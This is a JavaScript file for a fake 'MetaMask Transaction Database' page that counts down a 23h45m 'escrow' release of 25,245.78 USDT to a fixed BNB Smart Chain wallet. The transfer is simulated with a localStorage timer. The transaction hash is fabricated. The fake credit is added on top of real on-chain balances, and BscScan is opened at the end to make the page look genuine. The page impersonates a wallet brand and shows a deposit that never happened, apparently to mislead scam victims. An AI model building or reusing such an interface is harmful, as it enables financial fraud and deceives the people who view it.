<script>
/* ============================================================
   MetaMask — Transaction Database
   Ongoing 23h 45m escrow -> wallet transfer
   ============================================================ */

var WALLET = '0xfe46bbfb161a724d8a9b77dbaf45d0da3b7ac373';

/* 23 hours 45 minutes */
var TOTAL_SEC  = 23 * 3600 + 45 * 60;      /* 85500 */
var TOTAL_USDT = 25245.78;

var START_KEY = 'mm-db-ongoing-23h45-start';
var DONE_KEY  = 'mm-db-ongoing-23h45-done';
var SCAN_KEY  = 'mm-db-ongoing-23h45-scan';

var BSCSCAN_ADDRESS = 'https://bscscan.com/address/' + WALLET + '#tokentxns';

/* BNB Smart Chain public RPC */
var BSC_RPCS = [
  'https://bsc-dataseed.binance.org/',
  'https://bsc-dataseed1.binance.org/',
  'https://bsc-dataseed2.binance.org/',
  'https://bsc-dataseed3.binance.org/'
];

var USDT_CONTRACT = '0x55d398326f99059fF775485246999027B3197955';
var USDT_DECIMALS = 18;
var BNB_DECIMALS  = 18;

var COINGECKO = 'https://api.coingecko.com/api/v3';

var ticker     = null;
var priceTimer = null;
var completed  = false;
var autoOpened = false;

var live = {
  bnbPrice: 0, bnbChange: 0,
  usdtPrice: 1, usdtChange: 0,
  bnbBalance: null,
  usdtBalance: null,
  pricesLoaded: false,
  chainLoaded: false
};

/* ---------- storage ---------- */
function lsGet(k, f) { try { var v = localStorage.getItem(k); return v === null ? f : v; } catch (e) { return f; } }
function lsSet(k, v) { try { localStorage.setItem(k, v); } catch (e) {} }

/* ---------- helpers ---------- */
function el(id) { return document.getElementById(id); }

function fmtUSD(n, d) {
  if (n === null || n === undefined || isNaN(n)) return '—';
  return '$' + Number(n).toLocaleString('en-US', {
    minimumFractionDigits: d == null ? 2 : d,
    maximumFractionDigits: d == null ? 2 : d
  });
}
function fmtNum(n, d) {
  if (n === null || n === undefined || isNaN(n)) return '—';
  return Number(n).toLocaleString('en-US', {
    minimumFractionDigits: d == null ? 2 : d,
    maximumFractionDigits: d == null ? 2 : d
  });
}
function fmtHMS(s) {
  s = Math.max(0, Math.floor(s));
  var h = Math.floor(s / 3600);
  var m = Math.floor((s % 3600) / 60);
  var x = s % 60;
  return String(h).padStart(2, '0') + ':' +
         String(m).padStart(2, '0') + ':' +
         String(x).padStart(2, '0');
}
function fmtShort(s) {
  s = Math.max(0, Math.floor(s));
  var h = Math.floor(s / 3600);
  var m = Math.floor((s % 3600) / 60);
  if (h > 0) return h + 'h ' + m + 'm';
  return m + 'm';
}

/* ---------- theme ---------- */
(function () {
  document.documentElement.setAttribute('data-theme', lsGet('mm-theme', 'dark'));
})();

function toggleTheme() {
  var root = document.documentElement;
  var next = root.getAttribute('data-theme') === 'dark' ? 'light' : 'dark';
  root.setAttribute('data-theme', next);
  lsSet('mm-theme', next);
  toast(next === 'dark' ? 'Dark mode' : 'Light mode');
}

/* ---------- toast ---------- */
var toastTimer = null;
function toast(msg) {
  var old = document.querySelector('.toast');
  if (old) old.remove();
  var d = document.createElement('div');
  d.className = 'toast';
  d.innerHTML = '<svg class="ico" viewBox="0 0 24 24"><use href="#i-check"/></svg><span></span>';
  d.querySelector('span').textContent = msg;
  document.body.appendChild(d);
  requestAnimationFrame(function () { d.classList.add('is-on'); });
  clearTimeout(toastTimer);
  toastTimer = setTimeout(function () {
    d.classList.remove('is-on');
    setTimeout(function () { d.remove(); }, 280);
  }, 2400);
}

/* ---------- copy / scroll ---------- */
function copyAddress() {
  if (navigator.clipboard && navigator.clipboard.writeText) {
    navigator.clipboard.writeText(WALLET)
      .then(function () { toast('Address copied'); })
      .catch(function () { toast(WALLET); });
  } else {
    toast(WALLET);
  }
}

function scrollToEl(sel) {
  var node = document.querySelector(sel);
  if (!node) return;
  var top = node.getBoundingClientRect().top + window.pageYOffset - 78;
  window.scrollTo({ top: top < 0 ? 0 : top, behavior: 'smooth' });
}

/* ============================================================
   TRANSACTION TIMELINE
   ============================================================ */
function getStart() {
  var v = lsGet(START_KEY, null);
  if (!v) {
    v = String(Date.now());
    lsSet(START_KEY, v);
  }
  return parseInt(v, 10) || Date.now();
}

function elapsedSec() {
  return Math.max(0, Math.floor((Date.now() - getStart()) / 1000));
}

function remainingSec() {
  return Math.max(0, TOTAL_SEC - elapsedSec());
}

function progress() {
  return Math.min(1, Math.max(0, elapsedSec() / TOTAL_SEC));
}

/* deterministic pseudo hash so the link is stable across reloads */
function txHash() {
  var seed = getStart();
  var h = 0x811c9dc5;
  var str = 'mm-db-' + seed;
  for (var i = 0; i < str.length; i++) {
    h ^= str.charCodeAt(i);
    h = (h * 0x01000193) >>> 0;
  }
  var out = '0x';
  for (var j = 0; j < 64; j++) {
    h = (h * 1103515245 + 12345) >>> 0;
    out += '0123456789abcdef'[h % 16];
  }
  return out;
}

/* ============================================================
   RENDER
   ============================================================ */
function render() {
  var rem = remainingSec();
  var p = progress();
  var pct = Math.round(p * 1000) / 10;

  var credited = TOTAL_USDT * p;
  var escrow   = TOTAL_USDT - credited;

  var usdtPrice = live.usdtPrice || 1;

  /* --- ring --- */
  var digits = el('ringDigits');
  if (digits && !completed) digits.textContent = fmtHMS(rem);

  var ring = el('ringProg');
  if (ring) {
    var C = 2 * Math.PI * 88;
    ring.style.strokeDasharray = C;
    ring.style.strokeDashoffset = (C * (1 - p)).toFixed(2);
  }

  /* --- progress bar --- */
  var fill = el('progFill');
  if (fill) fill.style.width = (p * 100).toFixed(2) + '%';

  var pctEl = el('progPct');
  if (pctEl && !completed) pctEl.textContent = pct.toFixed(1) + '%';

  /* --- stat strip --- */
  var sRem = el('statRemaining');
  if (sRem && !completed) sRem.textContent = fmtHMS(rem);

  var sEsc = el('statEscrow');
  if (sEsc) sEsc.textContent = fmtUSD(escrow * usdtPrice);

  var sCre = el('statCredited');
  if (sCre) sCre.textContent = fmtUSD(credited * usdtPrice);

  /* --- amount split --- */
  var escVal = el('escrowValue');
  if (escVal) escVal.innerHTML = fmtNum(escrow, 2) + '<small>USDT</small>';

  var escUsd = el('escrowUsd');
  if (escUsd) escUsd.textContent = '≈ ' + fmtUSD(escrow * usdtPrice);

  var escBar = el('escrowBar');
  if (escBar) escBar.style.width = ((escrow / TOTAL_USDT) * 100).toFixed(2) + '%';

  var creVal = el('creditedValue');
  if (creVal) creVal.innerHTML = fmtNum(credited, 2) + '<small>USDT</small>';

  var creUsd = el('creditedUsd');
  if (creUsd) creUsd.textContent = '≈ ' + fmtUSD(credited * usdtPrice);

  var creBar = el('creditedBar');
  if (creBar) creBar.style.width = (p * 100).toFixed(2) + '%';

  var portCred = el('portCredited');
  if (portCred) portCred.textContent = fmtUSD(credited * usdtPrice);

  /* --- details --- */
  var txRel = el('txReleased');
  if (txRel) txRel.textContent = fmtNum(credited, 2) + ' USDT';

  var rate = el('txRate');
  if (rate) {
    var perHour = TOTAL_USDT / (TOTAL_SEC / 3600);
    rate.textContent = fmtNum(perHour, 2) + ' USDT / hr';
  }

  var eta = el('progEta');
  if (eta && !completed) eta.textContent = 'Completes in ' + fmtShort(rem);

  var hTag = el('hTag1');
  if (hTag && !completed) hTag.textContent = fmtShort(rem);

  /* --- hero usd --- */
  var heroUsd = el('heroUsd');
  if (heroUsd) heroUsd.textContent = '≈ ' + fmtUSD(TOTAL_USDT * usdtPrice);

  /* --- stages --- */
  updateStages(p);

  /* --- complete? --- */
  if (rem <= 0 && !completed) {
    completeTransfer();
  }
}

function updateStages(p) {
  var stages = document.querySelectorAll('.stage');
  if (!stages.length) return;
  /* 0-8% initiated, 8-70% releasing, 70-99% confirming, 100% credited */
  var active = 1;
  if (p >= 1) active = 3;
  else if (p >= 0.70) active = 2;
  else if (p >= 0.08) active = 1;
  else active = 0;

  for (var i = 0; i < stages.length; i++) {
    stages[i].classList.remove('done', 'active');
    if (i < active) stages[i].classList.add('done');
    else if (i === active) stages[i].classList.add('active');
  }
  if (p >= 1) {
    for (var k = 0; k < stages.length; k++) stages[k].classList.add('done');
  }
}

/* ============================================================
   COMPLETION
   ============================================================ */
function completeTransfer() {
  if (completed) return;
  completed = true;
  lsSet(DONE_KEY, '1');

  /* ring -> check */
  var center = el('ringCenter');
  if (center) {
    center.innerHTML =
      '<div class="ring-check">' +
      '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.2" ' +
      'stroke-linecap="round" stroke-linejoin="round"><path d="m5 12.6 4.6 4.4L19 6.8"/></svg>' +
      '</div>';
  }

  var ring = el('ringProg');
  if (ring) {
    ring.style.strokeDashoffset = '0';
    ring.style.stroke = '#22c55e';
  }

  /* hero */
  var hero = el('ongoing');
  if (hero) hero.classList.add('is-done');

  var eyebrow = el('heroEyebrow');
  if (eyebrow) {
    eyebrow.className = 'eyebrow is-done';
    eyebrow.innerHTML = '<span class="pulse"></span> Transfer complete';
  }

  var title = el('heroTitle');
  if (title) title.textContent = 'Funds delivered to your wallet';

  var desc = el('heroDesc');
  if (desc) {
    desc.textContent = 'The full 25,245.78 USDT has been released from escrow and ' +
      'credited to your connected wallet on BNB Smart Chain. BscScan is opening now.';
  }

  var fill = el('progFill');
  if (fill) { fill.style.width = '100%'; fill.classList.add('done'); }

  var pctEl = el('progPct');
  if (pctEl) pctEl.textContent = '100%';

  var eta = el('progEta');
  if (eta) eta.textContent = 'Completed';

  /* stats */
  var sRem = el('statRemaining');
  if (sRem) sRem.textContent = '00:00:00';
  var sStatus = el('statStatus');
  if (sStatus) { sStatus.textContent = 'Completed'; sStatus.className = 'stat-v green'; }
  var sEsc = el('statEscrow');
  if (sEsc) { sEsc.textContent = '$0.00'; }
  var sCre = el('statCredited');
  if (sCre) sCre.textContent = fmtUSD(TOTAL_USDT * (live.usdtPrice || 1));

  /* amount split */
  var escVal = el('escrowValue');
  if (escVal) escVal.innerHTML = '0.00<small>USDT</small>';
  var escUsd = el('escrowUsd');
  if (escUsd) escUsd.textContent = '≈ $0.00';
  var escBar = el('escrowBar');
  if (escBar) escBar.style.width = '0%';

  var creVal = el('creditedValue');
  if (creVal) creVal.innerHTML = fmtNum(TOTAL_USDT, 2) + '<small>USDT</small>';
  var creUsd = el('creditedUsd');
  if (creUsd) creUsd.textContent = '≈ ' + fmtUSD(TOTAL_USDT * (live.usdtPrice || 1));
  var creBar = el('creditedBar');
  if (creBar) creBar.style.width = '100%';

  var walletCard = el('walletAmtCard');
  if (walletCard) walletCard.classList.add('full');

  /* details */
  var dStatus = el('detailsStatus');
  if (dStatus) { dStatus.className = 'status-pill st-success'; dStatus.textContent = 'Completed'; }

  var txRel = el('txReleased');
  if (txRel) txRel.textContent = fmtNum(TOTAL_USDT, 2) + ' USDT';

  /* banner */
  var banner = el('banner');
  if (banner) banner.classList.add('is-done');
  var bIcon = el('bannerIcon');
  if (bIcon) bIcon.innerHTML = '<use href="#i-check-circle"/>';
  var bText = el('bannerText');
  if (bText) {
    bText.innerHTML = '<b>Transfer complete.</b> 25,245.78 USDT has been credited to ' +
      '<b>0xfe46…c373</b>. BscScan is opening with the on-chain transaction.';
  }

  var scanSub = el('scanSub');
  if (scanSub) scanSub.textContent = 'Transfer confirmed · opening';

  /* history row */
  var hIcon = el('hIcon1');
  if (hIcon) hIcon.style.background = 'linear-gradient(135deg,#16a34a,#22c55e)';
  var hUse = el('hIcon1Use');
  if (hUse) hUse.setAttribute('href', '#i-check-circle');
  var hTitle = el('hTitle1');
  if (hTitle) hTitle.textContent = 'USDT transfer completed';
  var hSub = el('hSub1');
  if (hSub) hSub.textContent = '25,245.78 USDT · credited to wallet';
  var hAmt = el('hAmt1');
  if (hAmt) { hAmt.className = 'up'; hAmt.textContent = '+25,245.78'; }
  var hTag = el('hTag1');
  if (hTag) hTag.textContent = 'credited';

  /* USDT row undim */
  var usdtLogo = el('usdtLogo');
  if (usdtLogo) usdtLogo.classList.remove('dim');

  /* re-render balances so credited deposit shows */
  renderBalances();

  toast('Transfer complete — 25,245.78 USDT credited');

  /* open BscScan */
  setTimeout(function () {
    showOverlay();
    setTimeout(function () { openBscScan(false); }, 1400);
  }, 600);
}

/* ============================================================
   BSCSCAN
   ============================================================ */
function openBscScan(manual) {
  var url = BSCSCAN_ADDRESS;
  var win = window.open(url, '_blank', 'noopener,noreferrer');

  if (win) {
    lsSet(SCAN_KEY, '1');
    if (manual) toast('Opening BscScan…');
    closeOverlay();
  } else {
    /* popup blocked */
    var sub = el('scanSub');
    if (sub) sub.textContent = 'Popup blocked — use the button below';
    if (manual) toast('Allow popups to open BscScan');
  }
}

function showOverlay() {
  var ov = el('overlay');
  if (ov) ov.hidden = false;
  document.body.classList.add('no-scroll');
}

function closeOverlay() {
  var ov = el('overlay');
  if (ov) ov.hidden = true;
  document.body.classList.remove('no-scroll');
}

/* ============================================================
   ON-CHAIN BALANCES
   ============================================================ */
var rpcIndex = 0;

function rpcCall(method, params) {
  var url = BSC_RPCS[rpcIndex % BSC_RPCS.length];

  return fetch(url, {
    method: 'POST',
    headers: { 'Content-Type': 'application/json' },
    body: JSON.stringify({ jsonrpc: '2.0', id: 1, method: method, params: params })
  })
  .then(function (r) {
    if (!r.ok) throw new Error('HTTP ' + r.status);
    return r.json();
  })
  .then(function (json) {
    if (json.error) throw new Error(json.error.message || 'RPC error');
    return json.result;
  })
  .catch(function (err) {
    rpcIndex++;
    if (rpcIndex % BSC_RPCS.length === 0) throw err;
    return rpcCall(method, params);
  });
}

function weiToNumber(hex, decimals) {
  if (!hex || typeof hex !== 'string' || hex === '0x') return 0;
  var big;
  try { big = BigInt(hex); } catch (e) { return 0; }
  var base = BigInt(10) ** BigInt(decimals);
  var whole = big / base;
  var frac = big % base;
  var fracStr = frac.toString().padStart(decimals, '0').slice(0, 8);
  return parseFloat(whole.toString() + '.' + fracStr);
}

function padAddress(addr) {
  return '000000000000000000000000' + addr.toLowerCase().replace(/^0x/, '');
}

function fetchBnbBalance() {
  return rpcCall('eth_getBalance', [WALLET, 'latest']).then(function (hex) {
    live.bnbBalance = weiToNumber(hex, BNB_DECIMALS);
    return live.bnbBalance;
  });
}

function fetchUsdtBalance() {
  var data = '0x70a08231' + padAddress(WALLET);
  return rpcCall('eth_call', [{ to: USDT_CONTRACT, data: data }, 'latest']).then(function (hex) {
    live.usdtBalance = weiToNumber(hex, USDT_DECIMALS);
    return live.usdtBalance;
  });
}

function loadOnChainBalances() {
  var sync = el('syncState');
  if (sync) sync.textContent = 'Fetching balances…';

  Promise.all([
    fetchBnbBalance().catch(function () { return null; }),
    fetchUsdtBalance().catch(function () { return null; })
  ]).then(function () {
    live.chainLoaded = live.bnbBalance !== null || live.usdtBalance !== null;
    if (sync) sync.textContent = live.chainLoaded ? 'On-chain · live' : 'RPC retrying';
    var rpc = el('rpcStatus');
    if (rpc) rpc.textContent = live.chainLoaded ? 'live' : 'retry';
    renderBalances();
  });
}

/* ---------- prices ---------- */
function loadPrices() {
  var url = COINGECKO + '/simple/price?ids=binancecoin,tether' +
            '&vs_currencies=usd&include_24hr_change=true';

  fetch(url)
    .then(function (r) { if (!r.ok) throw new Error('HTTP ' + r.status); return r.json(); })
    .then(function (d) {
      if (d && d.binancecoin) {
        live.bnbPrice  = d.binancecoin.usd || 0;
        live.bnbChange = d.binancecoin.usd_24h_change || 0;
      }
      if (d && d.tether) {
        live.usdtPrice  = d.tether.usd || 1;
        live.usdtChange = d.tether.usd_24h_change || 0;
      }
      live.pricesLoaded = true;
      renderBalances();
      render();
    })
    .catch(function () {
      if (!live.pricesLoaded) {
        live.bnbPrice = 0;
        live.usdtPrice = 1;
        live.pricesLoaded = true;
        renderBalances();
      }
    });
}

/* ---------- logos ---------- */
var logoCache = {};

function loadLogo(coinId) {
  if (logoCache[coinId]) { applyLogo(coinId, logoCache[coinId]); return; }

  fetch(COINGECKO + '/coins/' + coinId +
        '?localization=false&tickers=false&market_data=false' +
        '&community_data=false&developer_data=false')
    .then(function (r) { if (!r.ok) throw new Error('bad'); return r.json(); })
    .then(function (d) {
      var url = d && d.image ? (d.image.large || d.image.small || d.image.thumb) : '';
      if (!url) return;
      logoCache[coinId] = url;
      applyLogo(coinId, url);
    })
    .catch(function () {});
}

function applyLogo(coinId, url) {
  var nodes = document.querySelectorAll('[data-logo="' + coinId + '"]');
  for (var i = 0; i < nodes.length; i++) {
    var node = nodes[i];
    var img = document.createElement('img');
    img.src = url;
    img.alt = coinId;
    img.loading = 'lazy';
    img.onerror = function () {};
    node.innerHTML = '';
    node.appendChild(img);
  }
}

/* ---------- balances render ---------- */
function renderBalances() {
  var bnbBal  = live.bnbBalance;
  var usdtBal = live.usdtBalance;

  var bnbUsdValue  = bnbBal  === null ? null : bnbBal  * (live.bnbPrice || 0);
  var usdtUsdValue = usdtBal === null ? null : usdtBal * (live.usdtPrice || 1);

  /* credited deposit adds to the wallet USDT once complete */
  var creditedUsdt = completed ? TOTAL_USDT : 0;
  var totalUsdt    = usdtBal === null ? null : usdtBal + creditedUsdt;

  /* BNB row */
  var bnbUsd = el('bnbUsd');
  if (bnbUsd) bnbUsd.textContent = bnbUsdValue === null ? '—' : fmtUSD(bnbUsdValue);

  var bnbSym = el('bnbSym');
  if (bnbSym) {
    bnbSym.textContent = bnbBal === null
      ? 'loading on-chain…'
      : fmtNum(bnbBal, 6) + ' BNB · native';
  }

  var bnbChange = el('bnbChange');
  if (bnbChange) {
    if (!live.pricesLoaded) { bnbChange.textContent = '—'; bnbChange.className = 'up'; }
    else {
      var up = live.bnbChange >= 0;
      bnbChange.className = up ? 'up' : 'down';
      bnbChange.textContent = (up ? '+' : '') + live.bnbChange.toFixed(2) + '%';
    }
  }

  /* USDT row */
  var usdtVal = el('usdtVal');
  if (usdtVal) {
    usdtVal.textContent = totalUsdt === null
      ? '—'
      : fmtNum(totalUsdt, 2) + ' USDT';
    usdtVal.className = completed ? '' : 'pend';
  }

  var usdtUsd = el('usdtUsd');
  if (usdtUsd) {
    usdtUsd.textContent = totalUsdt === null
      ? 'loading…'
      : fmtUSD(totalUsdt * (live.usdtPrice || 1));
    usdtUsd.className = completed ? 'up' : 'pend';
  }

  var usdtSym = el('usdtSym');
  if (usdtSym) {
    usdtSym.textContent = usdtBal === null
      ? 'loading on-chain…'
      : (completed ? 'BEP-20 · deposit credited' : 'BEP-20 · on-chain');
  }

  /* sidebar */
  var sideBnb = el('sideBnb');
  if (sideBnb) sideBnb.textContent = bnbBal === null ? '—' : fmtNum(bnbBal, 4);
  var sideUsdt = el('sideUsdt');
  if (sideUsdt) sideUsdt.textContent = totalUsdt === null ? '—' : fmtNum(totalUsdt, 2);

  /* hero usd */
  var heroUsd = el('heroUsd');
  if (heroUsd) heroUsd.textContent = '≈ ' + fmtUSD(TOTAL_USDT * (live.usdtPrice || 1));
}

/* ============================================================
   BOOT
   ============================================================ */
document.addEventListener('DOMContentLoaded', function () {

  /* theme */
  var themeBtn = el('themeBtn');
  if (themeBtn) themeBtn.addEventListener('click', toggleTheme);

  /* tx id */
  var txIdEl = el('txId');
  if (txIdEl) txIdEl.textContent = txHash();

  /* timeline labels */
  var start = getStart();
  var startedEl = el('txStarted');
  if (startedEl) startedEl.textContent = new Date(start).toLocaleString();
  var completesEl = el('txCompletes');
  if (completesEl) completesEl.textContent = new Date(start + TOTAL_SEC * 1000).toLocaleString();

  /* esc key closes overlay */
  document.addEventListener('keydown', function (e) {
    if (e.key === 'Escape') closeOverlay();
  });

  /* prices + logos */
  loadPrices();
  loadLogo('binancecoin');
  loadLogo('tether');
  loadOnChainBalances();

  /* was it already complete on a previous visit? */
  if (lsGet(DONE_KEY, '') === '1') {
    render();
    completeTransfer();
    autoOpened = lsGet(SCAN_KEY, '') === '1';
    /* don't force another overlay if they already saw it */
    if (!autoOpened) {
      setTimeout(showOverlay, 700);
      setTimeout(function () { openBscScan(false); }, 2000);
    } else {
      closeOverlay();
    }
  } else {
    render();
    ticker = setInterval(render, 1000);
  }

  /* refresh balances every 60s */
  priceTimer = setInterval(function () {
    loadPrices();
    loadOnChainBalances();
  }, 60000);

  /* re-render on resize (ring scaling) */
  var rTimer = null;
  window.addEventListener('resize', function () {
    clearTimeout(rTimer);
    rTimer = setTimeout(render, 160);
  });
});
